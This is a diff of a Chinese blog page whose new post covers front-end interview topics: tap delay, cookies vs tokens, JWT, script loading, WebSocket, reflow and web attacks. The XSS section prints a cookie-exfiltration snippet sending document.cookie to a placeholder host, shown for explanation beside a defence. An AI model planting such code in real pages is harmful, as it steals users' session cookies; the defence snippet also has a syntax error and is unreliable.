@@ -16,25 +16,24 @@
   <meta name="author" content="软软糯糯的汤圆">
   <meta name="keywords" content="个人博客,JS笔记">
   
-    <meta name="description" content="HTTP的版本迭代过程参考文章：https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6908327746473033741#heading-8 HTTP 1.0 和 HTTP 1.1 之间有哪些区别？持久化连接http1.0 默认使用非持久连接，而 http1.1 默认使用持久连接。http1.1 通过使用持久连接来使多个 http 请求复用同一个 TCP 连接，以此来避免使用非持久连接时每次需要建立连">
+    <meta name="description" content="浅窥前端知识技能广度移动端点击时间为什么会延迟300ms？怎么解决？因为以前移动端经常需要做双击放大操作，单击后会等待300ms看有无双击操作，会造成300ms的延迟 解决办法：FastClick库。原理：  监听 touchend 事件( touchstart touchend 会先于 click 触发）  使用自定义 DOM 事件模拟一个 click 事件 把默认的 click 事件（300m">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HTTP的版本迭代过程">
-<meta property="og:url" content="http://rrnn.gitee.io/2022/08/14/HTTP%E7%9A%84%E7%89%88%E6%9C%AC%E8%BF%AD%E4%BB%A3%E8%BF%87%E7%A8%8B/index.html">
+<meta property="og:title" content="浅窥前端技能知识广度">
+<meta property="og:url" content="http://rrnn.gitee.io/2022/08/16/%E6%B5%85%E7%AA%A5%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%B9%BF%E5%BA%A6/index.html">
 <meta property="og:site_name" content="Tangyuan的博客">
-<meta property="og:description" content="HTTP的版本迭代过程参考文章：https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6908327746473033741#heading-8 HTTP 1.0 和 HTTP 1.1 之间有哪些区别？持久化连接http1.0 默认使用非持久连接，而 http1.1 默认使用持久连接。http1.1 通过使用持久连接来使多个 http 请求复用同一个 TCP 连接，以此来避免使用非持久连接时每次需要建立连">
+<meta property="og:description" content="浅窥前端知识技能广度移动端点击时间为什么会延迟300ms？怎么解决？因为以前移动端经常需要做双击放大操作，单击后会等待300ms看有无双击操作，会造成300ms的延迟 解决办法：FastClick库。原理：  监听 touchend 事件( touchstart touchend 会先于 click 触发）  使用自定义 DOM 事件模拟一个 click 事件 把默认的 click 事件（300m">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://th.wallhaven.cc/small/72/72por3.jpg">
-<meta property="article:published_time" content="2022-08-14T08:54:11.000Z">
-<meta property="article:modified_time" content="2022-08-14T08:54:37.861Z">
+<meta property="og:image" content="https://th.wallhaven.cc/lg/6o/6oxgp6.jpg">
+<meta property="article:published_time" content="2022-08-16T03:03:39.000Z">
+<meta property="article:modified_time" content="2022-08-17T11:04:10.098Z">
 <meta property="article:author" content="软软糯糯的汤圆">
 <meta property="article:tag" content="技术分析">
-<meta property="article:tag" content="计算机网络">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://th.wallhaven.cc/small/72/72por3.jpg">
+<meta name="twitter:image" content="https://th.wallhaven.cc/lg/6o/6oxgp6.jpg">
   
   
   
-  <title>HTTP的版本迭代过程 - Tangyuan的博客</title>
+  <title>浅窥前端技能知识广度 - Tangyuan的博客</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -222,13 +221,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('https://w.wallhaven.cc/full/72/wallhaven-72por3.jpg') no-repeat center center; background-size: cover;">
+     style="background: url('https://w.wallhaven.cc/full/6o/wallhaven-6oxgp6.jpg') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="HTTP的版本迭代过程"></span>
+            <span id="subtitle" data-typed-text="浅窥前端技能知识广度"></span>
           
         </div>
 
@@ -239,8 +238,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-08-14 16:54" pubdate>
-          2022年8月14日 下午
+        <time datetime="2022-08-16 11:03" pubdate>
+          2022年8月16日 上午
         </time>
       </span>
     
@@ -251,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2k 字
+          2.4k 字
         
       </span>
     
@@ -262,7 +261,7 @@
         
         
         
-          17 分钟
+          20 分钟
         
       </span>
     
@@ -308,48 +307,152 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">HTTP的版本迭代过程</h1>
+            <h1 style="display: none">浅窥前端技能知识广度</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="HTTP的版本迭代过程"><a href="#HTTP的版本迭代过程" class="headerlink" title="HTTP的版本迭代过程"></a>HTTP的版本迭代过程</h1><p>参考文章：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6908327746473033741#heading-8">https://juejin.cn/post/6908327746473033741#heading-8</a></p>
-<h3 id="HTTP-1-0-和-HTTP-1-1-之间有哪些区别？"><a href="#HTTP-1-0-和-HTTP-1-1-之间有哪些区别？" class="headerlink" title="HTTP 1.0 和 HTTP 1.1 之间有哪些区别？"></a>HTTP 1.0 和 HTTP 1.1 之间有哪些区别？</h3><h5 id="持久化连接"><a href="#持久化连接" class="headerlink" title="持久化连接"></a>持久化连接</h5><p>http1.0 默认使用非持久连接，而 http1.1 默认使用持久连接。http1.1 通过使用持久连接来使多个 http 请求复用同一个 TCP 连接，以此来避免使用非持久连接时每次需要建立连接的时延。</p>
-<h5 id="支持部分资源请求"><a href="#支持部分资源请求" class="headerlink" title="支持部分资源请求"></a>支持部分资源请求</h5><p>在 http1.0 中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，http1.1 则在请求头引入了 range 头域，它允许只请求资源的某个部分，即返回码是 206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</p>
-<h5 id="添加更多控制缓存策略"><a href="#添加更多控制缓存策略" class="headerlink" title="添加更多控制缓存策略"></a>添加更多控制缓存策略</h5><p><strong>缓存方面</strong>，在 http1.0 中主要使用 header 里的 If-Modified-Since、Expires 来做为缓存判断的标准，http1.1 则引入了更多的缓存控制策略，例如 Etag、If-Unmodified-Since、If-Match、If-None-Match 等更多可供选择的缓存头来控制缓存策略。</p>
-<h5 id="添加Host字段"><a href="#添加Host字段" class="headerlink" title="添加Host字段"></a>添加Host字段</h5><p>http1.1 中<strong>新增了 host 字段</strong>，用来指定服务器的域名。http1.0 中认为每台服务器都绑定一个唯一的 IP 地址，因此，请求消息中的 URL 并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机，并且它们共享一个IP地址。因此有了 host 字段，这样就可以将请求发往到同一台服务器上的不同网站。</p>
-<h5 id="添加更多请求方法"><a href="#添加更多请求方法" class="headerlink" title="添加更多请求方法"></a>添加更多请求方法</h5><p>http1.1 相对于 http1.0 还新增了很多<strong>请求方法</strong>，如 PUT、HEAD、OPTIONS 等。</p>
-<h3 id="HTTP-1-1-和-HTTP-2-0-的区别"><a href="#HTTP-1-1-和-HTTP-2-0-的区别" class="headerlink" title="HTTP 1.1 和 HTTP 2.0 的区别"></a>HTTP 1.1 和 HTTP 2.0 的区别</h3><h5 id="改为二进制协议"><a href="#改为二进制协议" class="headerlink" title="改为二进制协议"></a>改为二进制协议</h5><p>HTTP/2 是一个二进制协议。在 HTTP/1.1 版中，报文的头信息必须是文本（ASCII 编码），数据体可以是文本，也可以是二进制。HTTP/2 则是一个彻底的二进制协议，头信息和数据体都是二进制，并且统称为”帧”，可以分为头信息帧和数据帧。 帧的概念是它实现多路复用的基础。</p>
-<h5 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h5><p>HTTP/2 实现了多路复用，HTTP/2 仍然复用 TCP 连接，但是在一个连接里，客户端和服务器都可以同时发送多个请求或回应，而且不用按照顺序一一发送，这样就避免了”队头堵塞”【1】的问题。</p>
-<p><strong>数据流</strong></p>
-<p>HTTP/2 使用了数据流的概念，因为 HTTP/2 的数据包是不按顺序发送的，同一个连接里面连续的数据包，可能属于不同的请求。因此，必须要对数据包做标记，指出它属于哪个请求。HTTP/2 将每个请求或回应的所有数据包，称为一个数据流。每个数据流都有一个独一无二的编号。数据包发送时，都必须标记数据流 ID ，用来区分它属于哪个数据流。</p>
-<h5 id="头信息压缩"><a href="#头信息压缩" class="headerlink" title="头信息压缩"></a><strong>头信息压缩</strong></h5><p> HTTP/2 实现了头信息压缩，由于 HTTP 1.1 协议不带状态，每次请求都必须附上所有信息。所以，请求的很多字段都是重复的，比如 Cookie 和 User Agent ，一模一样的内容，每次请求都必须附带，这会浪费很多带宽，也影响速度。HTTP/2 对这一点做了优化，引入了头信息压缩机制。一方面，头信息使用 gzip 或 compress 压缩后再发送；另一方面，客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，以后就不发送同样字段了，只发送索引号，这样就能提高速度了。</p>
-<h5 id="支持服务器推送"><a href="#支持服务器推送" class="headerlink" title="支持服务器推送"></a>支持<strong>服务器推送</strong></h5><p>HTTP/2 允许服务器未经请求，主动向客户端发送资源，这叫做服务器推送。使用服务器推送提前给客户端推送必要的资源，这样就可以相对减少一些延迟时间。这里需要注意的是 http2 下服务器主动推送的是静态资源，和 WebSocket 以及使用 SSE 等方式向客户端发送即时数据的推送是不同的。</p>
-<h3 id="HTTP-3-0"><a href="#HTTP-3-0" class="headerlink" title="HTTP 3.0"></a>HTTP 3.0</h3><p>HTTP/3基于UDP协议实现了类似于TCP的多路复用数据流、传输可靠性等功能，这套功能被称为QUIC协议。</p>
-<h5 id="流量控制、传输可靠性功能"><a href="#流量控制、传输可靠性功能" class="headerlink" title="流量控制、传输可靠性功能"></a>流量控制、传输可靠性功能</h5><p>QUIC在UDP的基础上增加了一层来保证数据传输可靠性，它提供了数据包重传、拥塞控制、以及其他一些TCP中的特性。</p>
-<h5 id="集成TLS加密功能"><a href="#集成TLS加密功能" class="headerlink" title="集成TLS加密功能"></a>集成TLS加密功能</h5><p>目前QUIC使用TLS1.3，减少了握手所花费的RTT数。</p>
-<h5 id="多路复用-1"><a href="#多路复用-1" class="headerlink" title="多路复用"></a>多路复用</h5><p>同一物理连接上可以有多个独立的逻辑数据流，实现了数据流的单独传输，解决了TCP的队头阻塞问题。</p>
-<h5 id="快速握手"><a href="#快速握手" class="headerlink" title="快速握手"></a>快速握手</h5><p>由于基于UDP，可以实现使用0 ~ 1个RTT来建立连接。</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="http1-1"><a href="#http1-1" class="headerlink" title="http1.1"></a>http1.1</h4><ul>
-<li>持久化连接</li>
-<li>支持部分资源传输（206）</li>
-<li>添加更多缓存策略（etag）</li>
-<li>添加host请求头</li>
-<li>支持更多请求方法（put options 等）</li>
+                <h1 id="浅窥前端知识技能广度"><a href="#浅窥前端知识技能广度" class="headerlink" title="浅窥前端知识技能广度"></a>浅窥前端知识技能广度</h1><h3 id="移动端点击时间为什么会延迟300ms？怎么解决？"><a href="#移动端点击时间为什么会延迟300ms？怎么解决？" class="headerlink" title="移动端点击时间为什么会延迟300ms？怎么解决？"></a>移动端点击时间为什么会延迟300ms？怎么解决？</h3><p>因为以前移动端经常需要做双击放大操作，单击后会等待300ms看有无双击操作，会造成300ms的延迟</p>
+<p>解决办法：FastClick库。原理：</p>
+<ul>
+<li>监听 touchend 事件( touchstart touchend 会先于 click 触发） </li>
+<li>使用自定义 DOM 事件模拟一个 click 事件</li>
+<li>把默认的 click 事件（300ms 之后触发）禁止掉</li>
 </ul>
-<h4 id="Http2-0"><a href="#Http2-0" class="headerlink" title="Http2.0"></a>Http2.0</h4><ul>
-<li>多路复用</li>
-<li>二进制协议</li>
-<li>请求头压缩</li>
-<li>服务端推送资源</li>
-<li>数据流添加id</li>
+<p>现在浏览器做了改进，若content 设为device-width 就不会有300ms延迟</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h58e6qeof4j21eo09n40e.jpg" srcset="/img/loading.gif" lazyload alt="image-20220816102137489"></p>
+<h3 id="网络请求中，token和cookie有什么区别？"><a href="#网络请求中，token和cookie有什么区别？" class="headerlink" title="网络请求中，token和cookie有什么区别？"></a>网络请求中，token和cookie有什么区别？</h3><h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><ul>
+<li>HTTP无状态，每次都携带cookie，以帮助识别身份</li>
+<li>服务端也可以set-cookie，cookie大小限制4k</li>
+<li>默认有跨域限制，不可跨域共享，传递cookie</li>
+<li>现在浏览器开始禁止第三方cookie 因为广告中的JS的cookie可能会跟其他页面共享</li>
 </ul>
-<h4 id="http3-0"><a href="#http3-0" class="headerlink" title="http3.0"></a>http3.0</h4><ul>
-<li>改为使用QUIC（魔改UDP）</li>
-<li>多路复用</li>
-<li>基于TLS加密</li>
-<li>流量控制，传输可靠</li>
-<li>快速握手</li>
+<h4 id="cookie和session"><a href="#cookie和session" class="headerlink" title="cookie和session"></a>cookie和session</h4><ul>
+<li>cookie用于登录验证，存储用户标识</li>
+<li>session在服务端，存储用户详细信息，和cookie信息一一对应</li>
+<li>cookie + session是一种常见的登录验证解决方案</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h58eilsz2yj21fc0iawh7.jpg" srcset="/img/loading.gif" lazyload alt="image-20220816103304681"></p>
+<h4 id="token-和-cookie-的区别"><a href="#token-和-cookie-的区别" class="headerlink" title="token 和 cookie 的区别"></a>token 和 cookie 的区别</h4><ul>
+<li><p>cookie是HTTP规范 而token是自定义传递</p>
+</li>
+<li><p>cookie会默认被浏览器存储，而token需要自己存储</p>
+</li>
+<li><p>token默认没有跨域限制</p>
+</li>
+</ul>
+<p>cookie是HTTP标准，跨域限制，配合session使用</p>
+<p>token无标准，无跨域限制，用于JWT</p>
+<h4 id="Session-和-JWT哪个更好"><a href="#Session-和-JWT哪个更好" class="headerlink" title="Session 和 JWT哪个更好"></a>Session 和 JWT哪个更好</h4><ul>
+<li>Session的优点<ul>
+<li>原理简单，易于学习</li>
+<li>用户信息存储在服务端，可以快速封禁某个用户</li>
+</ul>
+</li>
+<li>Session的缺点<ul>
+<li>占用服务端内存，硬件成本高</li>
+<li>多进程，多服务器，不好同步，需要Redis第三方缓存</li>
+<li>默认有跨域限制</li>
+</ul>
+</li>
+<li>JWT的优点<ul>
+<li>不占用服务器内存</li>
+<li>多进程，多服务器不受影响</li>
+<li>没有跨域限制</li>
+</ul>
+</li>
+<li>JWT的缺点<ul>
+<li>用户信息存储在客户端，无法快速封禁用户</li>
+<li>万一服务端密钥被泄漏，用户信息全部泄露</li>
+<li>token体积大于cookie，增加请求数据量</li>
+</ul>
+</li>
+</ul>
+<p>如果有严格管理用户信息的需求（保密，快速封禁）推荐session</p>
+<p>如果没有特殊要求，小型公司使用JWT（减少服务端成本）</p>
+<h3 id="script-defer和async有什么区别？"><a href="#script-defer和async有什么区别？" class="headerlink" title="script defer和async有什么区别？"></a>script defer和async有什么区别？</h3><ul>
+<li>一般情况下，加载HTML文档，遇到script标签html停止加载，等script标签加载并执行后在继续加载HTML文档</li>
+<li>script标签被defer修饰后，script加载和html加载会异步进行，但执行script是在文档加载完之后。</li>
+<li>cript标签被async修饰后，script加载和html加载会异步进行，但和defer不同的是，script加载完后会立刻执行，html等待script执行完后再继续。</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h59li4x98kj21eh0b2jsz.jpg" srcset="/img/loading.gif" lazyload alt="image-20220817112020846"></p>
+<h3 id="你知道哪些前端攻击？如何预防？"><a href="#你知道哪些前端攻击？如何预防？" class="headerlink" title="你知道哪些前端攻击？如何预防？"></a>你知道哪些前端攻击？如何预防？</h3><h4 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h4><ul>
+<li>Cross Site Script 跨站脚本攻击</li>
+<li>手段：黑客将JS代码插入到网页中，渲染时执行JS代码</li>
+<li>预防：特殊字符替换</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> img = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;image&#x27;</span>)<br>img.<span class="hljs-property">src</span> = <span class="hljs-string">&quot;https://xxx.com/api/xxx?cookie=&quot;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span><br></code></pre></td></tr></table></figure>
+
+<p>借此收集用户cookie信息</p>
+<p>预防方法</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> newStr = str.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&#x27;&lt;&#x27;</span>,<span class="hljs-string">&#x27;&amp;lt;&#x27;</span>).<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>;<span class="hljs-string">&#x27;&amp;gt;&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>在vue中默认屏蔽html攻击，但使用v-html 可能会产生影响</li>
+</ul>
+<h4 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h4><ul>
+<li>Cross Site Request Forgery 跨站请求伪造</li>
+<li>手段：黑客诱导用户去访问另一个网站的接口，伪造请求</li>
+</ul>
+<p>预防方法</p>
+<ul>
+<li>严格的跨域请求限制，如判断 referrer（请求来源） </li>
+<li>为 cookie 设置 SameSite，禁止跨域传递 cookie 关键接口</li>
+<li>使用短信验证码</li>
+</ul>
+<h4 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h4><ul>
+<li>Click Jacking </li>
+<li>手段：诱导界面上蒙一个透明的计rame，诱导用户点击</li>
+<li>预防：让计rame 不能跨域加载</li>
+</ul>
+<h4 id="DDos攻击-（准确说不是前端安全）"><a href="#DDos攻击-（准确说不是前端安全）" class="headerlink" title="DDos攻击 （准确说不是前端安全）"></a>DDos攻击 （准确说不是前端安全）</h4><ul>
+<li>分布式拒绝服务</li>
+<li>分布式的，大规模的流量访问，使服务器瘫痪</li>
+</ul>
+<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><ul>
+<li>黑客提交的内容注入SQL语句</li>
+<li>解决办法：和XSS一样，替换字符</li>
+</ul>
+<h3 id="WebScoket和HTTP的区别"><a href="#WebScoket和HTTP的区别" class="headerlink" title="WebScoket和HTTP的区别"></a>WebScoket和HTTP的区别</h3><h4 id="webSocket"><a href="#webSocket" class="headerlink" title="webSocket"></a>webSocket</h4><ul>
+<li>支持端对端的通讯</li>
+<li>可以由client发起，也可以由server发起</li>
+<li>用于：消息通知，直播间讨论，聊天室，协同编辑</li>
+</ul>
+<h4 id="webSocket链接过程"><a href="#webSocket链接过程" class="headerlink" title="webSocket链接过程"></a>webSocket链接过程</h4><ul>
+<li>先发起一个HTTP请求</li>
+<li>成功之后再升级到websocket协议，再通讯</li>
+</ul>
+<h4 id="webSocket和HTTP的区别"><a href="#webSocket和HTTP的区别" class="headerlink" title="webSocket和HTTP的区别"></a>webSocket和HTTP的区别</h4><ul>
+<li>WebSocket的协议名是ws://,可以双端发起清请求</li>
+<li>WebSocket没有跨域限制</li>
+<li>通过send和onmessage通讯，HTTP通过req和res</li>
+</ul>
+<p>ws可以升级为wws</p>
+<p>实际项目可以使用socket.io，更简洁</p>
+<h4 id="HTTP和webSocket的长轮询的区别"><a href="#HTTP和webSocket的长轮询的区别" class="headerlink" title="HTTP和webSocket的长轮询的区别"></a>HTTP和webSocket的长轮询的区别</h4><ul>
+<li>HTTP 长轮询：客户端发起请求，服务端阻塞，不会立即返回 </li>
+<li>WebSocket：客户端可发起请求，服务端也可发起请求</li>
+</ul>
+<h3 id="重绘和重拍有什么区别"><a href="#重绘和重拍有什么区别" class="headerlink" title="重绘和重拍有什么区别"></a>重绘和重拍有什么区别</h3><h4 id="重绘repaint"><a href="#重绘repaint" class="headerlink" title="重绘repaint"></a>重绘repaint</h4><ul>
+<li>元素外观改变，如颜色，背景色</li>
+<li>但元素的尺寸，定位不变，不会影响其他元素的位置</li>
+</ul>
+<h4 id="重排"><a href="#重排" class="headerlink" title="重排"></a>重排</h4><ul>
+<li>重新计算尺寸和布局，可能会影响其他元素的位置</li>
+<li>如元素增高，可能会使相邻元素下移</li>
+</ul>
+<h4 id="减少重排的方法"><a href="#减少重排的方法" class="headerlink" title="减少重排的方法"></a>减少重排的方法</h4><ul>
+<li>集中修改样式，或直接切换css class</li>
+<li>修改之前设置 display:none 脱离文档流</li>
+<li>使用BFC特性，不影响其他元素</li>
+<li>频繁触发使用节流和防抖</li>
+<li>使用createDocumentFragment批量操作DOM</li>
+<li>优化动画，使用CSS3和requestAnimationFrame</li>
+</ul>
+<h3 id="如何实现网页多标签通讯？"><a href="#如何实现网页多标签通讯？" class="headerlink" title="如何实现网页多标签通讯？"></a>如何实现网页多标签通讯？</h3><ul>
+<li>WebSocket需要服务端，成本高</li>
+<li>localStorage简单易用，推荐</li>
+<li>SharedWorker调试不方便，不兼容IE11</li>
 </ul>
 
                 
@@ -386,8 +489,6 @@
       
         <a href="/tags/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/">#技术分析</a>
       
-        <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">#计算机网络</a>
-      
     </div>
   
 </div>
@@ -398,8 +499,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>HTTP的版本迭代过程</div>
-      <div>http://rrnn.gitee.io/2022/08/14/HTTP的版本迭代过程/</div>
+      <div>浅窥前端技能知识广度</div>
+      <div>http://rrnn.gitee.io/2022/08/16/浅窥前端知识技能广度/</div>
     </div>
     <div class="license-meta">
       
@@ -411,7 +512,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年8月14日</div>
+          <div>2022年8月16日</div>
         </div>
       
       
@@ -441,9 +542,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/08/15/%E6%B5%85%E7%AA%A5%E5%89%8D%E7%AB%AF%E6%8A%80%E8%83%BD%E7%9F%A5%E8%AF%86%E6%B7%B1%E5%BA%A6/" title="浅窥前端技能知识深度">
+                      <a href="/2022/08/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20-%20%E4%BA%8C%E5%8F%89%E6%A0%91/" title="数据结构 --- 二叉树的遍历">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">浅窥前端技能知识深度</span>
+                        <span class="hidden-mobile">数据结构 --- 二叉树的遍历</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -451,8 +552,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/08/14/css/5-%E7%A7%8D%E5%B8%B8%E7%94%A8%E5%B8%83%E5%B1%80%E7%9A%84-flex-%E5%AE%9E%E7%8E%B0/" title="5 种常用布局的 flex 实现">
-                        <span class="hidden-mobile">5 种常用布局的 flex 实现</span>
+                      <a href="/2022/08/15/%E6%B5%85%E7%AA%A5%E5%89%8D%E7%AB%AF%E6%8A%80%E8%83%BD%E7%9F%A5%E8%AF%86%E6%B7%B1%E5%BA%A6/" title="浅窥前端技能知识深度">
+                        <span class="hidden-mobile">浅窥前端技能知识深度</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
